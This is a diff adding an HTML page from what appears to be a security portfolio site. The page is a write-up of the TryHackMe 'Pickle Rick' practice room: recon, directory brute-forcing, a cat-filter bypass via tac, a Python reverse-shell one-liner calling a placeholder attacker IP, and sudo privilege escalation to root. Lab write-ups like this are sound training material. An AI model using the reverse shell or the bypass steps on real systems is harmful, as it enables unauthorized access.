@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pickle Rick — Case File — Trent</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<nav>
+  <div class="wrap">
+    <div class="nav-brand">trent<span>@</span>secops</div>
+    <ul class="nav-links">
+      <li><a href="../index.html#capabilities">Capabilities</a></li>
+      <li><a href="../index.html#cases">Case Files</a></li>
+      <li><a href="../index.html#path">Certification Path</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="writeup-header">
+  <div class="wrap">
+    <a class="back-link" href="index.html">&larr; Back to all case files</a>
+    <div class="ticket-bar" style="margin-top:18px;">
+      <span class="ticket-id">CASE-04</span>
+      <span class="status-badge status-resolved">Resolved</span>
+      <span>Web Exploitation / Linux Privilege Escalation</span>
+    </div>
+    <h1>Pickle Rick</h1>
+    <div class="writeup-meta-grid">
+      <span><strong>Room</strong> TryHackMe — Pickle Rick</span>
+    </div>
+    <div class="case-tags">
+      <span class="tag">Web Exploitation</span>
+        <span class="tag">Filter Bypass</span>
+        <span class="tag">sudo PrivEsc</span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+  <article class="writeup-body">
+<p><strong>Category:</strong> Web Exploitation / Linux Privilege Escalation
+<strong>Target:</strong> THM "Pickle Rick" room
+<strong>Open Ports:</strong> 22 (SSH), 80 (HTTP)</p>
+<h2>Objective</h2>
+<p>Find three "ingredients" hidden on the box to help Rick complete his pickle-reverse potion, ultimately escalating to root.</p>
+<hr />
+<h2>1. Initial Recon</h2>
+<p>Started with a look at the web server on port 80. Viewing the page source revealed an HTML comment left behind in the source code:</p>
+<pre><code class="language-html">&lt;!--
+Note to self, remember username!
+Username: R1ckRul3s
+--&gt;
+</code></pre>
+<p>Checked <code>/robots.txt</code> next, which returned a single string:</p>
+<pre><code>Wubbalubbadubdub
+</code></pre>
+<p>Port 22 (SSH) was open but restricted to public-key authentication only, ruling it out as an entry point without a valid key. This pointed toward the web server (port 80) as the way in.</p>
+<h2>2. Directory Enumeration</h2>
+<p>Ran <code>gobuster</code> against the site to find hidden paths:</p>
+<pre><code>gobuster dir -u http://&lt;target_ip&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
+</code></pre>
+<p>An initial scan with <code>common.txt</code> only turned up files already linked from the homepage (<code>/assets</code>, <code>/index.html</code>, <code>/robots.txt</code>). Switching to a larger wordlist and explicitly searching for <code>.php</code> extensions surfaced a hidden login page.</p>
+<h2>3. Authentication</h2>
+<p>Used the two pieces of info gathered so far as credentials:</p>
+<ul>
+<li><strong>Username:</strong> <code>R1ckRul3s</code></li>
+<li><strong>Password:</strong> <code>Wubbalubbadubdub</code></li>
+</ul>
+<p>This successfully logged in to the portal. Most tabs were locked behind a "only the real Rick can view this page" message.</p>
+<h2>4. Decoding the Hidden String</h2>
+<p>Viewing the page source on the locked page revealed a Base64-encoded string. Decoding it once produced another Base64-looking string — a double-encoded value. Decoding a second time revealed the plaintext:</p>
+<pre><code>rabbit hole
+</code></pre>
+<p>This turned out to be a red herring / troll planted by the box author rather than a usable clue.</p>
+<h2>5. Finding the Command Panel</h2>
+<p>Continued exploring the portal and located a <strong>command panel</strong> — a web-based interface that accepts and executes OS commands as the web server user.</p>
+<p>Confirmed code execution with <code>whoami</code>:</p>
+<pre><code>www-data
+</code></pre>
+<h2>6. Filter Bypass</h2>
+<p>Listing files (<code>ls</code>) worked normally and revealed:</p>
+<pre><code>Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+</code></pre>
+<p>Attempting to read files with <code>cat</code> was blocked — the panel was filtering that specific command. Bypassed the filter using <code>tac</code> (cat backwards), which is not blocked and reads files in the same way (just reversed line order):</p>
+<pre><code>tac Sup3rS3cretPickl3Ingred.txt
+</code></pre>
+<p><strong>Ingredient #1:</strong> Mr. Meeseek hair</p>
+<h2>7. Filesystem Enumeration for Ingredient #2</h2>
+<p>Searched the filesystem broadly for related files:</p>
+<pre><code>find / -iname &quot;*ingredient*&quot; 2&gt;/dev/null
+</code></pre>
+<p>Located and read a second file elsewhere on the filesystem using <code>tac</code>.</p>
+<p><strong>Ingredient #2:</strong> 1 Jerry tear</p>
+<h2>8. Upgrading to a Reverse Shell</h2>
+<p>The command panel's filtering made continued enumeration tedious, so pivoted to a full reverse shell for unrestricted access.</p>
+<p>Set up a listener on the attacking machine (using the VPN tunnel IP, <code>tun0</code>):</p>
+<pre><code>nc -lvnp 4444
+</code></pre>
+<p>Triggered a callback from the target through the command panel using a Python one-liner:</p>
+<pre><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;attacker_tun0_ip&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)'
+</code></pre>
+<p>Received a shell as <code>www-data</code>.</p>
+<h2>9. Privilege Escalation</h2>
+<p>Checked sudo permissions:</p>
+<pre><code>sudo -l
+</code></pre>
+<p>Result:</p>
+<pre><code>User www-data may run the following commands on ip-10-64-158-3:
+    (ALL) NOPASSWD: ALL
+</code></pre>
+<p><code>www-data</code> could run <strong>any command as root with no password required</strong> — a direct and immediate path to full root access.</p>
+<p>Escalated with:</p>
+<pre><code>sudo su
+</code></pre>
+<p>Confirmed root:</p>
+<pre><code>whoami
+# root
+</code></pre>
+<h2>10. Final Ingredient &amp; Flag</h2>
+<p>With root access, navigated to <code>/root/</code> and located the third ingredient, completing Rick's potion, along with the final root flag.</p>
+<hr />
+<h2>Key Takeaways</h2>
+<ul>
+<li><strong>Information disclosure in source code</strong> (HTML comments) can leak credentials directly — always view-source, not just the rendered page.</li>
+<li><strong><code>robots.txt</code></strong> is a classic, easy-to-miss spot for hidden strings or paths.</li>
+<li><strong>Directory brute-forcing</strong> needs the right wordlist and extension flags (<code>-x php</code>) — default scans can easily miss key pages.</li>
+<li><strong>Command filtering is rarely comprehensive</strong> — when one command (<code>cat</code>) is blocked, functional equivalents (<code>tac</code>, <code>head</code>, <code>less</code>, <code>strings</code>, etc.) often aren't.</li>
+<li><strong>A restrictive shell (like a web command panel) should be upgraded to a full reverse shell</strong> as soon as possible — it removes filtering friction and gives access to standard tools.</li>
+<li><strong>Always run <code>sudo -l</code></strong> as part of standard privilege escalation enumeration — misconfigured NOPASSWD rules are one of the fastest wins available.</li>
+</ul>
+  </article>
+</div>
+
+<footer>
+  <div class="wrap">
+    <a class="back-link" href="index.html">&larr; Back to all case files</a>
+  </div>
+</footer>
+
+</body>
+</html>
